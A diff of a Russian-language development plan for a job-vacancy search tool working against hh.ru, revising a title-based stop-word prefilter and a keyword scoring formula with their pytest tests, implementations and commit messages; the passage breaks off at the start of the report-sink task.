@@ -1872,81 +1872,201 @@ git commit -m "feat: хранилище на SQLite
 - Consumes: `SignalMatcher` из Task 2, `DiscoveredVacancy` из Task 3, `ProfileConfig` из Task 1
 - Produces: `class Prefilter(profile: ProfileConfig)` с методом `reason_to_reject(vacancy: DiscoveredVacancy) -> str | None` (возвращает причину отказа или `None`, если вакансия проходит дальше)
 
+**Что изменил переезд источника.** Discovery идёт по листингу `/vacancies/{slug}`, а он
+отдаёт только id, url и заголовок (спека §3.2). Обещание прежней редакции — «префильтр по
+заголовку **и региону**» — больше невыполнимо: региона, компании и зарплаты на этом шаге
+физически нет, они приезжают со страницы вакансии, то есть уже после того, как за неё
+заплачено запросом. Задача отсеивает по заголовку и только по нему.
+
+**Что здесь дорого.** Ложный отказ — это `status='rejected'` навсегда: вакансия не
+вернётся ни следующим прогоном, ни после правки конфига. Пропущенный мусор стоит одного
+запроса к hh.ru. Асимметрия и определяет набор тестов: главный из них — на живой фикстуре
+листинга, и он проверяет **список выживших целиком**, а не число отказов.
+
+Пустой стоп-сигнал (`SignalMatcher([""])` совпадает почти с любым текстом, а отказ
+необратим и с пустой причиной в логе) **уже закрыт** коммитом `e588f4d` — и валидатором
+конфига (`Signal` в `config/models.py`), и самим `_compile`. Задача 7 на это опирается и
+ничего не изобретает заново; тест остаётся как страховка на самое дорогое.
+
 - [ ] **Step 1: Написать падающий тест**
 
 Создать `tests/test_prefilter.py`:
 
 ```python
-from datetime import datetime
+import gzip
+from pathlib import Path
 
-from hh_search.config.models import (
-    ProfileConfig,
-    Saturation,
-    Signals,
-    Weights,
-)
+import pytest
+from pydantic import ValidationError
+
+from hh_search.config.models import ProfileConfig, Saturation, Signals, Weights
 from hh_search.domain.models import DiscoveredVacancy
+from hh_search.filtering.matching import SignalMatcher
 from hh_search.filtering.prefilter import Prefilter
+from hh_search.sources.listing import parse_listing
+
+FIXTURES = Path(__file__).parent / "fixtures"
+LIVE_LISTING = "listing_programmist.html.gz"
+
+# Стоп-слова образца profile.yaml из спеки §7 — ровно те, что поедут в прод.
+SPEC_NEGATIVE = [
+    "junior",
+    "стажёр",
+    "intern",
+    "1c",
+    "продаж",
+    "рекрутер",
+    "ручн тестиров",
+    "оператор пк",
+    "оператор call",
+    "оператор колл",
+    "оператор станка",
+    "курьер",
+]
 
 
-def make_profile() -> ProfileConfig:
+def make_profile(negative: list[str]) -> ProfileConfig:
+    """Профиль, в котором заполнено только то, что читает префильтр.
+
+    Позитивные сигналы намеренно пусты: на шаге 3 они не участвуют вовсе,
+    и пустые списки это фиксируют лучше любого комментария.
+    """
     return ProfileConfig(
         weights=Weights(title=0.4, stack=0.3, responsibilities=0.2, domain=0.1),
         saturation=Saturation(stack=5, responsibilities=3),
         penalty_per_signal=15,
         signals=Signals(
-            title_roles=["team lead"],
-            title_tech=["backend"],
-            stack=["yocto"],
-            responsibilities=["архитектур"],
-            domain=["телеком"],
+            title_roles=[],
+            title_tech=[],
+            stack=[],
+            responsibilities=[],
+            domain=[],
         ),
-        negative=["junior", "стажёр", "1c", "продаж"],
+        negative=negative,
     )
 
 
-def make_vacancy(title: str) -> DiscoveredVacancy:
+def make_vacancy(title: str, company: str | None = None) -> DiscoveredVacancy:
+    """Ровно то, что даёт листинг: id, url, title (спека §3.2)."""
     return DiscoveredVacancy(
         id="1",
         url="https://hh.ru/vacancy/1",
         title=title,
-        published_at=datetime(2026, 7, 27),
-        found_by_query="Yocto",
+        company=company,
+        found_by_query="programmist",
     )
 
 
+def load(name: str) -> str:
+    with gzip.open(FIXTURES / name, "rt", encoding="utf-8") as handle:
+        return handle.read()
+
+
 def test_clean_title_passes() -> None:
-    assert Prefilter(make_profile()).reason_to_reject(make_vacancy("Backend Team Lead")) is None
+    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
+    assert prefilter.reason_to_reject(make_vacancy("Backend Team Lead")) is None
 
 
-def test_negative_signal_in_title_is_rejected() -> None:
-    reason = Prefilter(make_profile()).reason_to_reject(make_vacancy("Junior Python Developer"))
-    assert reason is not None
-    assert "junior" in reason
+def test_reason_names_the_stop_word_that_decided() -> None:
+    """Причина уходит в `reject_reason` и остаётся единственным следом
+    решения: без названного слова отладку списка сигналов не провести."""
+    reason = Prefilter(make_profile(SPEC_NEGATIVE)).reason_to_reject(
+        make_vacancy("Junior Python Developer")
+    )
+    assert reason == "стоп-слово в заголовке: junior"
 
 
-def test_cyrillic_spelling_of_1c_is_rejected() -> None:
-    reason = Prefilter(make_profile()).reason_to_reject(make_vacancy("Программист 1С"))
-    assert reason is not None
+def test_reason_lists_every_matched_stop_word_in_config_order() -> None:
+    """Три совпадения — три слова в причине. Первое из них ничем не лучше
+    остальных, а «одно слово из трёх» превращает отладку в угадывание."""
+    reason = Prefilter(make_profile(SPEC_NEGATIVE)).reason_to_reject(
+        make_vacancy("Программист 1С (стажер/junior)")
+    )
+    assert reason == "стоп-слово в заголовке: junior, стажёр, 1c"
 
 
-def test_morphological_form_of_stop_word_is_rejected() -> None:
-    reason = Prefilter(make_profile()).reason_to_reject(make_vacancy("Менеджер по продажам"))
-    assert reason is not None
+def test_empty_negative_list_rejects_nothing() -> None:
+    """Профиль без стоп-слов — законная конфигурация: конвейер тогда просто
+    не отсеивает ничего локально, а не отсеивает всё."""
+    prefilter = Prefilter(make_profile([]))
+    assert prefilter.reason_to_reject(make_vacancy("Курьер на личном автомобиле")) is None
 
 
-def test_similar_looking_word_is_not_rejected() -> None:
-    assert Prefilter(make_profile()).reason_to_reject(make_vacancy("Senior C++ Developer")) is None
+def test_only_the_title_is_examined() -> None:
+    """На шаге 3 известен только заголовок (спека §3.2): компания и регион
+    приходят со страницы вакансии, то есть уже после оплаты запросом.
+    Стоп-слово в поле, которого у листинга нет, отказом быть не может."""
+    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
+    vacancy = make_vacancy("Инженер-программист", company="Продажи и курьеры")
+    assert prefilter.reason_to_reject(vacancy) is None
+
+
+def test_empty_stop_word_cannot_reach_the_prefilter() -> None:
+    """Страховка на самое дорогое: пустой сигнал компилируется в регулярку
+    из одних границ слова и отбраковывает почти любой заголовок — молча и
+    необратимо. Отвергается дважды, и оба раза проверяются здесь."""
+    with pytest.raises(ValidationError):
+        make_profile([""])
+    with pytest.raises(ValueError, match="пустой сигнал"):
+        SignalMatcher([" "])
+
+
+def test_no_good_title_is_lost_on_the_live_listing() -> None:
+    """Живая страница `/vacancies/programmist`, 20 настоящих заголовков.
+
+    Проверяется список выживших ЦЕЛИКОМ, а не только число отказов: ложный
+    отказ выбрасывает хорошую вакансию навсегда, и это самая дорогая
+    ошибка конвейера. Список зафиксирован по факту прогона; любое
+    расширение стоп-слов, задевающее эти девять заголовков, обязано
+    покраснеть здесь.
+    """
+    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
+    vacancies = parse_listing(load(LIVE_LISTING), "programmist")
+    assert len(vacancies) == 20
+
+    survived = [v.title for v in vacancies if prefilter.reason_to_reject(v) is None]
+    assert survived == [
+        "Программист: WinForms (MVP), C#, .NET",
+        "Программист-разработчик С#",
+        "Java разработчик (ученик)",
+        "Программист .Net",
+        "Разработчик систем извлечения данных",
+        "Инженер-программист",
+        "Преподаватель для младшей школы (программирование и ИТ)",
+        "Программист на ПО Fansy (SPECTRE, DEPO)",
+        "Программист SQL/Delphi",
+    ]
 ```
+
+Про живую фикстуру, чтобы число не выглядело магическим: из 20 заголовков префильтр
+отбраковывает 11 (стажёр/junior/1С в разных написаниях) и пропускает 9 — **ноль ложных
+отказов**. Среди пропущенных есть заведомо нерелевантные («Преподаватель для младшей
+школы») — это правильная сторона размена: их отсеет скоринг, и они стоят одного запроса,
+а не потерянной вакансии.
 
 - [ ] **Step 2: Запустить тест и убедиться, что он падает**
 
 Run: `uv run pytest tests/test_prefilter.py -v`
-Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.filtering.prefilter'`
+Expected: `ModuleNotFoundError: No module named 'hh_search.filtering.prefilter'`, «1 error»
+(падение на сборке модуля — файла ещё нет)
 
 - [ ] **Step 3: Реализовать `hh_search/filtering/prefilter.py`**
 
 ```python
+"""Шаг 3 конвейера: единственный барьер перед дорогим шагом 4.
+
+На этом шаге известен ТОЛЬКО заголовок. Discovery идёт по листингу
+`/vacancies/{slug}`, который отдаёт id, url и название — компания, регион,
+зарплата и дата публикации приходят со страницы вакансии, то есть уже
+после того, как за неё заплачено запросом (спека §3.2, §4.1). Поэтому
+отсева по региону здесь нет и быть не может.
+
+Цена ошибки асимметрична: ложный отказ — это `status='rejected'`
+навсегда, хорошая вакансия не вернётся ни следующим прогоном, ни после
+правки конфига. Пропущенный мусор стоит одного запроса к hh.ru. Отсюда
+и правило: отсеиваем только по явным стоп-словам, ничего не угадываем.
+"""
+
 from hh_search.config.models import ProfileConfig
 from hh_search.domain.models import DiscoveredVacancy
 from hh_search.filtering.matching import SignalMatcher
@@ -1956,19 +2076,36 @@ class Prefilter:
     """Дешёвый отсев по заголовку — стоит до скачивания страницы вакансии."""
 
     def __init__(self, profile: ProfileConfig) -> None:
+        # Пустой сигнал сюда не доедет: его отвергают и валидатор конфига
+        # (`Signal` в config/models.py), и сам `_compile`. Проверять третий
+        # раз здесь нечего — но тест на это в suite'е есть, потому что
+        # именно в отсеве последствия такого сигнала необратимы.
         self._negative = SignalMatcher(profile.negative)
 
     def reason_to_reject(self, vacancy: DiscoveredVacancy) -> str | None:
+        """Причина отказа или `None`, если вакансия идёт дальше.
+
+        В причину попадают ВСЕ совпавшие стоп-слова, а не первое: причина
+        уходит в `reject_reason` и остаётся единственным следом решения,
+        а «одно слово из трёх» превращает отладку списка сигналов в
+        угадывание.
+        """
         matched = self._negative.find(vacancy.title)
         if matched:
             return f"стоп-слово в заголовке: {', '.join(matched)}"
         return None
 ```
 
-- [ ] **Step 4: Запустить тесты и убедиться, что они проходят**
+- [ ] **Step 4: Запустить все проверки**
 
-Run: `uv run pytest tests/test_prefilter.py -v && uv run mypy hh_search`
-Expected: 5 passed
+Run: `uv run pytest tests/test_prefilter.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/filtering/prefilter.py tests/test_prefilter.py`
+Expected: `7 passed`, затем `245 passed` (238 до задачи + 7), `Success: no issues found`,
+`All checks passed!`, `2 files already formatted`
+
+`ruff format --check` запускается **по новым файлам, а не по репозиторию**: форматтер
+вводится в CI задачей 13, и на текущем HEAD ему не соответствуют 13 существующих файлов.
+Новый код обязан соответствовать сразу, чтобы задача 13 не превратилась в переформатирование
+всего проекта.
 
 - [ ] **Step 5: Коммит**
 
@@ -1977,7 +2114,11 @@ git add hh_search/filtering/prefilter.py tests/test_prefilter.py
 git commit -m "feat: префильтр по стоп-словам в заголовке
 
 Отсекает мусор до скачивания страницы вакансии — именно этот шаг
-удерживает нагрузку на hh.ru на уровне единиц запросов за прогон."
+удерживает нагрузку на hh.ru на уровне единиц запросов за прогон.
+Отсев только по заголовку: после переезда discovery на листинг
+регион и компания на этом шаге неизвестны в принципе.
+Главный тест — на живой фикстуре листинга: 20 настоящих заголовков,
+11 отказов, ноль ложных. Ложный отказ необратим."
 ```
 
 ---
@@ -1992,25 +2133,57 @@ git commit -m "feat: префильтр по стоп-словам в загол
 - Consumes: `ProfileConfig` из Task 1, `SignalMatcher` из Task 2, `DiscoveredVacancy`/`VacancyDetails`/`ScoreBreakdown` из Task 3
 - Produces: протокол `Scorer` с методом `score(discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown`; `class KeywordScorer(profile: ProfileConfig)`, реализующий его
 
-Формула (спека §6): `total = clamp(100 × (0.40·title + 0.30·stack + 0.20·responsibilities + 0.10·domain) − penalty, 0, 100)`.
+Формула (спека §6): `total = max(100 × (0.40·title + 0.30·stack + 0.20·responsibilities + 0.10·domain) − penalty, 0)`.
 Компонент `title` — 1.0, если в заголовке есть и роль, и технология; 0.5, если что-то одно; иначе 0.
 `stack` и `responsibilities` — `min(len(найдено) / saturation, 1.0)` по описанию.
 `domain` — 1.0, если сигнал домена встретился в описании или названии компании.
 `penalty` — количество негативных сигналов в заголовке и описании, умноженное на `penalty_per_signal`.
+
+**Три решения, которые обязаны попасть в код именно так, потому что иначе тесты стерегут
+не то, ради чего задача существует.**
+
+1. **Компания читается из `details`, а не только из `discovered`.** Листинг компанию не
+   отдаёт, а в базу она попадает тем же `save_enriched`, который сохраняет оценку, — то
+   есть **после** вызова скорера. Читая только `discovered.company`, домен терялся бы у
+   каждой вакансии на первом прогоне и находился лишь при локальном пересчёте.
+2. **Верхнего `clamp` нет.** Компоненты ≤ 1.0, веса неотрицательны и суммируются в 1.0
+   (валидатор `Weights`), штраф неотрицателен (`penalty_per_signal ≥ 0`) — значит
+   `total ≤ 100` по построению. `min(..., 100.0)` был бы кодом, который не исполняется ни
+   на одном валидном входе, то есть и проверить его нечем. Нижний `max(..., 0.0)`
+   достижим любым мусорным заголовком и тестом закрыт.
+3. **Округляется только `total`.** Компоненты остаются как есть (`0.3333…`, а не `0.33`):
+   `score_detail` читает человек, настраивающий веса, и арифметика §6 по разбивке должна
+   сходиться обратно к `total`. Округлённые компоненты её ломают: `0.20·0.33` даёт 58.6
+   там, где формула даёт 58.7. Пример JSON в §6 спеки округлён для читаемости — это
+   иллюстрация, а не формат.
+
+**Известное ограничение, не закрываемое кодом:** дубликат в списке сигналов накручивает
+насыщение. `stack: [yocto, yocto, yocto, yocto, yocto]` при `saturation.stack = 5` даёт
+1.0 на описании с одним словом, потому что `find` возвращает по одному вхождению на
+паттерн, а не на уникальное слово. Дубликат в YAML — законный ключ с законным значением,
+ловить его нечем; проверяется глазами при правке профиля.
 
 - [ ] **Step 1: Написать падающий тест**
 
 Создать `tests/test_scoring.py`:
 
 ```python
-from datetime import datetime
+import gzip
+from pathlib import Path
 
 from hh_search.config.models import ProfileConfig, Saturation, Signals, Weights
-from hh_search.domain.models import DiscoveredVacancy, VacancyDetails
+from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, VacancyDetails
 from hh_search.scoring.keyword import KeywordScorer
+from hh_search.sources.vacancy_page import parse_vacancy_page
+
+FIXTURES = Path(__file__).parent / "fixtures"
+LIVE_VACANCY = "vacancy.html.gz"
 
 
 def make_profile() -> ProfileConfig:
+    """Стенд для арифметики §6: в stack шесть сигналов при насыщении 5, в
+    responsibilities четыре при насыщении 3 — иначе «насыщение» проверить
+    нечем, `min(n/n, 1.0)` и `n/n` неразличимы."""
     return ProfileConfig(
         weights=Weights(title=0.4, stack=0.3, responsibilities=0.2, domain=0.1),
         saturation=Saturation(stack=5, responsibilities=3),
@@ -2018,31 +2191,44 @@ def make_profile() -> ProfileConfig:
         signals=Signals(
             title_roles=["team lead", "senior"],
             title_tech=["backend", "embedded"],
-            stack=["yocto", "buildroot", "c++", "kubernetes", "kafka"],
-            responsibilities=["архитектур", "менторинг", "код-ревью"],
+            stack=["yocto", "buildroot", "c++", "kubernetes", "kafka", "docker"],
+            responsibilities=["архитектур", "менторинг", "код-ревью", "проектирован"],
             domain=["телеком"],
         ),
-        negative=["junior", "1c"],
+        negative=["junior", "1c", "продаж"],
     )
 
 
-def score_for(title: str, description: str, company: str | None = None) -> object:
+def score_for(
+    title: str,
+    description: str,
+    company: str | None = None,
+    page_company: str | None = None,
+) -> ScoreBreakdown:
     discovered = DiscoveredVacancy(
         id="1",
         url="https://hh.ru/vacancy/1",
         title=title,
         company=company,
-        published_at=datetime(2026, 7, 27),
-        found_by_query="Yocto",
+        found_by_query="programmist",
     )
-    return KeywordScorer(make_profile()).score(discovered, VacancyDetails(description=description))
+    details = VacancyDetails(description=description, company=page_company)
+    return KeywordScorer(make_profile()).score(discovered, details)
+
+
+def load(name: str) -> str:
+    with gzip.open(FIXTURES / name, "rt", encoding="utf-8") as handle:
+        return handle.read()
+
+
+# --- отдельные компоненты -------------------------------------------------
 
 
 def test_empty_vacancy_scores_zero() -> None:
     assert score_for("Курьер", "Доставка заказов").total == 0.0
 
 
-def test_title_with_role_and_tech_gives_full_title_component() -> None:
+def test_title_needs_both_role_and_tech_for_full_component() -> None:
     assert score_for("Senior Embedded Engineer", "").title == 1.0
 
 
@@ -2050,48 +2236,169 @@ def test_title_with_only_role_gives_half() -> None:
     assert score_for("Senior Engineer", "").title == 0.5
 
 
-def test_stack_saturates_at_configured_count() -> None:
-    description = "Yocto, Buildroot, C++, Kubernetes, Kafka и ещё раз Yocto"
-    assert score_for("Инженер", description).stack == 1.0
-
-
 def test_stack_is_proportional_below_saturation() -> None:
     assert score_for("Инженер", "Опыт Yocto и Buildroot").stack == 0.4
 
 
-def test_responsibilities_use_their_own_saturation() -> None:
-    assert score_for("Инженер", "Архитектура, менторинг, код-ревью").responsibilities == 1.0
+def test_stack_saturates_above_configured_count() -> None:
+    """Шесть сигналов при насыщении 5. Ровно пять ничего не доказали бы:
+    `min(5/5, 1.0)` равно `5/5` при любом устройстве формулы."""
+    result = score_for(
+        "Senior Embedded Engineer",
+        "Yocto, Buildroot, C++, Kubernetes, Kafka, Docker — всё это в проекте",
+    )
+    assert result.stack == 1.0
+    # Без насыщения было бы 6/5 = 1.2 и total 76.0.
+    assert result.total == 70.0
+
+
+def test_responsibilities_saturate_above_their_own_count() -> None:
+    """У responsibilities своё насыщение (3), и оно тоже проверяется
+    превышением: четыре сигнала при трёх."""
+    result = score_for(
+        "Инженер",
+        "Архитектура, менторинг, код-ревью и проектирование подсистем",
+    )
+    assert result.responsibilities == 1.0
+    # Без насыщения было бы 4/3 = 1.33 и total 26.7.
+    assert result.total == 20.0
 
 
 def test_domain_matches_company_name() -> None:
     assert score_for("Инженер", "", company="Телеком Решения").domain == 1.0
 
 
+def test_domain_sees_the_company_from_the_freshly_parsed_page() -> None:
+    """На первом скоринге компания известна только из `details`.
+
+    Листинг её не отдаёт, а в базу она попадает тем же `save_enriched`,
+    который сохраняет оценку, — то есть ПОСЛЕ вызова скорера. Читать
+    только `discovered.company` значило бы терять домен у каждой вакансии
+    на первом прогоне и находить его лишь при локальном пересчёте.
+    """
+    assert score_for("Инженер", "", page_company="Телеком Решения").domain == 1.0
+
+
+# --- формула целиком ------------------------------------------------------
+
+
+def test_weights_follow_the_spec_formula() -> None:
+    """0.40·1.0 + 0.30·(2/5) + 0.20·(1/3) + 0.10·0 = 0.5867 → 58.7.
+
+    Все четыре компонента здесь РАЗНЫЕ, поэтому перестановка любых двух
+    весов меняет результат. Тест «идеальная вакансия даёт 100» этого не
+    ловит: при всех компонентах 1.0 сумма весов равна 1.0 в любом порядке.
+    """
+    result = score_for("Senior Embedded Engineer", "Опыт Yocto и Buildroot, участие в архитектуре.")
+    assert result.title == 1.0
+    assert result.stack == 0.4
+    assert result.total == 58.7
+
+
 def test_perfect_match_reaches_hundred() -> None:
-    description = "Yocto Buildroot C++ Kubernetes Kafka. Архитектура, менторинг, код-ревью. Телеком"
+    description = (
+        "Yocto Buildroot C++ Kubernetes Kafka. "
+        "Архитектура, менторинг, код-ревью, проектирование. Телеком"
+    )
     assert score_for("Senior Embedded Engineer", description).total == 100.0
 
 
-def test_negative_signals_are_subtracted() -> None:
-    result = score_for("Senior Embedded Engineer", "Yocto Buildroot. Знание 1С обязательно")
-    assert result.penalty == 15.0
-    assert result.total < 100.0
+def test_penalty_scales_with_number_of_signals() -> None:
+    """Два стоп-слова — два штрафа. Одно неразличимо: `len(negative) * 15`
+    и `15 if negative else 0` дают на нём одно и то же число."""
+    result = score_for("Senior Embedded Engineer", "Знание 1С и опыт продаж")
+    assert result.matched["negative"] == ["1c", "продаж"]
+    assert result.penalty == 30.0
+    assert result.total == 10.0
 
 
 def test_total_never_goes_below_zero() -> None:
-    assert score_for("Junior 1C", "Junior 1C").total == 0.0
+    assert score_for("Junior 1C", "Junior 1C, продажи").total == 0.0
 
 
-def test_breakdown_records_matched_signals() -> None:
-    result = score_for("Senior Embedded Engineer", "Опыт Yocto и Kafka")
+def test_matched_lists_follow_config_order() -> None:
+    """Порядок в разбивке — порядок КОНФИГА, а не порядок вхождения в текст.
+    В описании сначала Kafka, в конфиге сначала yocto."""
+    result = score_for("Senior Embedded Engineer", "Опыт Kafka и Yocto")
     assert result.matched["stack"] == ["yocto", "kafka"]
     assert result.matched["title_roles"] == ["senior"]
+
+
+# --- живая страница -------------------------------------------------------
+
+
+def spec_profile() -> ProfileConfig:
+    """Образец profile.yaml из спеки §7 — тот, что поедет в прод.
+
+    Списки заданы через `|`, потому что среди сигналов есть многословные
+    («team lead», «ручн тестиров»), а вертикальная простыня из шестидесяти
+    строк не читается.
+    """
+    return ProfileConfig(
+        weights=Weights(title=0.40, stack=0.30, responsibilities=0.20, domain=0.10),
+        saturation=Saturation(stack=5, responsibilities=3),
+        penalty_per_signal=15,
+        signals=Signals(
+            title_roles="team lead|tech lead|teamlead|senior|ведущ|старш|руководител".split("|"),
+            title_tech="backend|embedded|linux|c++|python|node|node.js|nodejs|firmware".split("|"),
+            stack=(
+                "yocto|buildroot|openwrt|bsp|kernel|arm|arm64|armv7|armv8|c++|python|node.js|"
+                "typescript|docker|kubernetes|kafka|postgresql|clickhouse|llm|rag|mcp"
+            ).split("|"),
+            responsibilities=(
+                "архитектур|менторинг|код-ревью|code review|проектирован|техдолг"
+            ).split("|"),
+            domain="телеком|встраиваем|embedded|iot|микросервис".split("|"),
+        ),
+        negative=(
+            "junior|стажёр|intern|1c|продаж|рекрутер|ручн тестиров|оператор пк|"
+            "оператор call|оператор колл|оператор станка|курьер"
+        ).split("|"),
+        report_threshold=60,
+    )
+
+
+def test_live_vacancy_page_scores_as_measured() -> None:
+    """Живая страница вакансии, идеально целевая по названию, и профиль из §7.
+
+    Числа зафиксированы по факту прогона, а не по желаемому, и факт
+    неприятный: 80.0 набраны при НУЛЕВОМ вкладе обязанностей — ни один из
+    шести сигналов `responsibilities` в описании не встретился, хотя это
+    ровно та вакансия, ради которой сервис написан. Двадцать очков из ста
+    здесь не заработали, и увидеть это надо при реализации, а не в проде
+    по пустому разделу «Топ».
+
+    Заодно это второй, независимый от синтетики свидетель насыщения:
+    совпало семь сигналов стека при насыщении 5.
+    """
+    details = parse_vacancy_page(load(LIVE_VACANCY))
+    discovered = DiscoveredVacancy(
+        id="135586311",
+        url="https://hh.ru/vacancy/135586311",
+        title="Старший инженер-разработчик Embedded Linux (BSP, ARM64, i.MX 8M Plus)",
+        found_by_query="programmist",
+    )
+    result = KeywordScorer(spec_profile()).score(discovered, details)
+    assert result.matched["stack"] == ["yocto", "buildroot", "bsp", "kernel", "arm", "arm64", "c++"]
+    assert result.matched["responsibilities"] == []
+    assert (result.title, result.stack, result.responsibilities, result.domain) == (
+        1.0,
+        1.0,
+        0.0,
+        1.0,
+    )
+    assert result.penalty == 0.0
+    assert result.total == 80.0
 ```
+
+Тест на живой фикстуре — не украшение: он единственный, кто здесь смотрит на настоящий
+текст описания. Его вывод (80.0 при нулевых обязанностях) — вход для настройки профиля в
+задаче 12, а не повод подкрутить ожидание.
 
 - [ ] **Step 2: Запустить тест и убедиться, что он падает**
 
 Run: `uv run pytest tests/test_scoring.py -v`
-Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.scoring'`
+Expected: `ModuleNotFoundError: No module named 'hh_search.scoring'`, «1 error»
 
 - [ ] **Step 3: Реализовать `hh_search/scoring/base.py`**
 
@@ -2104,9 +2411,7 @@ from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, VacancyDe
 class Scorer(Protocol):
     """Точка расширения: сюда позже встанет оценщик на LLM (Claude, OpenAI, локальная модель)."""
 
-    def score(
-        self, discovered: DiscoveredVacancy, details: VacancyDetails
-    ) -> ScoreBreakdown: ...
+    def score(self, discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown: ...
 ```
 
 - [ ] **Step 4: Реализовать `hh_search/scoring/keyword.py`**
@@ -2118,7 +2423,18 @@ from hh_search.filtering.matching import SignalMatcher
 
 
 class KeywordScorer:
-    """Оценка по спискам ключевых слов из profile.yaml."""
+    """Оценка по спискам ключевых слов из profile.yaml (спека §6).
+
+    total = 100 × (w.title·title + w.stack·stack + w.resp·resp + w.domain·domain) − penalty,
+    снизу подрезано нулём.
+
+    Известное ограничение: дубликат в списке сигналов накручивает
+    насыщение. `stack: [yocto, yocto, yocto, yocto, yocto]` при
+    `saturation.stack = 5` даёт 1.0 на описании с одним словом — `find`
+    возвращает по одному вхождению на ПАТТЕРН, а не на уникальное слово.
+    Ловить это в коде нечем: дубликат в YAML — законный ключ с законным
+    значением. Проверяется глазами при правке профиля.
+    """
 
     def __init__(self, profile: ProfileConfig) -> None:
         self._profile = profile
@@ -2133,7 +2449,7 @@ class KeywordScorer:
     def score(self, discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown:
         title = discovered.title
         description = details.description
-        company = discovered.company or ""
+        company = discovered.company or details.company or ""
 
         roles = self._title_roles.find(title)
         tech = self._title_tech.find(title)
@@ -2143,6 +2459,10 @@ class KeywordScorer:
         negative = self._negative.find(f"{title}\n{description}")
 
         title_component = 1.0 if roles and tech else (0.5 if roles or tech else 0.0)
+        # Насыщение обязательно: без min(...) оценка измеряла бы длину
+        # описания, а не релевантность (спека §6). Делитель ≥ 1 гарантирован
+        # валидатором конфига — иначе здесь было бы деление на ноль уже
+        # ПОСЛЕ похода в сеть.
         stack_component = min(len(stack) / self._profile.saturation.stack, 1.0)
         responsibilities_component = min(
             len(responsibilities) / self._profile.saturation.responsibilities, 1.0
@@ -2156,8 +2476,16 @@ class KeywordScorer:
             + weights.responsibilities * responsibilities_component
             + weights.domain * domain_component
         )
+        # Штраф пропорционален ЧИСЛУ стоп-слов: одно случайное слово не
+        # убивает хорошую вакансию, три убивают (спека §6).
         penalty = len(negative) * self._profile.penalty_per_signal
-        total = min(max(100.0 * weighted - penalty, 0.0), 100.0)
+        # Верхнего clamp'а нет сознательно: компоненты ≤ 1.0, веса
+        # неотрицательны и суммируются в 1.0 (валидатор `Weights`), штраф
+        # неотрицателен — значит total ≤ 100 по построению, и min(..., 100)
+        # был бы кодом, который не может исполниться ни на одном входе, то
+        # есть и проверить его было бы нечем. Нижний нужен: штраф
+        # утаскивает сумму в минус на любом мусорном заголовке.
+        total = max(100.0 * weighted - penalty, 0.0)
 
         return ScoreBreakdown(
             title=title_component,
@@ -2165,6 +2493,9 @@ class KeywordScorer:
             responsibilities=responsibilities_component,
             domain=domain_component,
             penalty=penalty,
+            # Округляется только total — число, которое человек сравнивает с
+            # порогом. Компоненты остаются как есть: по ним арифметика §6
+            # должна сходиться обратно, а 0.67 вместо 1/3 её ломает.
             total=round(total, 1),
             matched={
                 "title_roles": roles,
@@ -2179,10 +2510,11 @@ class KeywordScorer:
 
 Создать пустой `hh_search/scoring/__init__.py`.
 
-- [ ] **Step 5: Запустить тесты и убедиться, что они проходят**
+- [ ] **Step 5: Запустить все проверки**
 
-Run: `uv run pytest tests/test_scoring.py -v && uv run mypy hh_search`
-Expected: 11 passed
+Run: `uv run pytest tests/test_scoring.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/scoring tests/test_scoring.py`
+Expected: `14 passed`, затем `259 passed`, `Success: no issues found`, `All checks passed!`,
+`4 files already formatted`
 
 - [ ] **Step 6: Коммит**
 
@@ -2191,10 +2523,15 @@ git add hh_search/scoring tests/test_scoring.py
 git commit -m "feat: keyword-скоринг с насыщением и штрафами
 
 Насыщение обязательно: без него оценка измеряла бы длину описания,
-а не релевантность. Штраф вычитается, а не умножается, поэтому одно
-случайное стоп-слово не убивает хорошую вакансию, а три убивают.
-Разбивка со списком совпавших слов сохраняется — без неё веса
-невозможно настроить."
+а не релевантность. Штраф вычитается пропорционально числу стоп-слов,
+поэтому одно случайное слово не убивает хорошую вакансию, а три
+убивают. Разбивка со списком совпавших слов сохраняется — без неё
+веса невозможно настроить.
+
+Тесты стерегут саму формулу: разные значения всех четырёх компонентов
+(перестановка весов краснеет), превышение насыщения, а не равенство
+ему, два стоп-слова вместо одного. Живая страница вакансии показывает
+факт: 80.0 при нулевом вкладе обязанностей."
 ```
 
 ---
@@ -2207,10 +2544,53 @@ git commit -m "feat: keyword-скоринг с насыщением и штра�
 
 **Interfaces:**
 - Consumes: `ScoredVacancy` из Task 3
-- Produces: протокол `Sink` (атрибут `name: str`, метод `emit(vacancies: Sequence[ScoredVacancy], now: datetime) -> None`); `class CsvSink(reports_dir: Path)`; `class MarkdownSink(reports_dir: Path, threshold: float)`; фабрика `build_sinks(names: Sequence[str], reports_dir: Path, threshold: float) -> list[Sink]` (неизвестное имя → `ValueError`)
+- Produces: протокол `Sink` (атрибут `name: str`, метод `emit(vacancies: Sequence[ScoredVacancy], now: datetime) -> None`), константа `REPORT_DATE_FORMAT`; `class CsvSink(reports_dir: Path)`; `class MarkdownSink(reports_dir: Path, threshold: float)`; фабрика `build_sinks(names: Sequence[str], reports_dir: Path, threshold: float) -> list[Sink]` (неизвестное имя → `ValueError`)
 
 Имена файлов: `{reports_dir}/{YYYY-MM-DD}-new.csv` и `{reports_dir}/{YYYY-MM-DD}-new.md`.
-Повторный прогон в тот же день дописывает данные в существующие файлы; заголовок CSV пишется только при создании.
+Повторный прогон в тот же день **дописывает** данные в существующие файлы; заголовок CSV и
+BOM пишутся только при создании.
+
+**Почему у этой задачи тесты подробнее кода.** После `mark_reported()` вакансия навсегда
+уходит из `unreported()` — переотправки нет по построению (спека §5.2). Всё, что приёмник
+потерял или затёр, потеряно **окончательно**: колонка, которую он не записал, раздел,
+который затёр второй прогон дня, вакансия, съеденная строгим неравенством на пороге. Из-за
+этого тесты проверяют состав строки CSV **целиком** (сравнением всего словаря
+`csv.DictReader`), а не три поля из двенадцати.
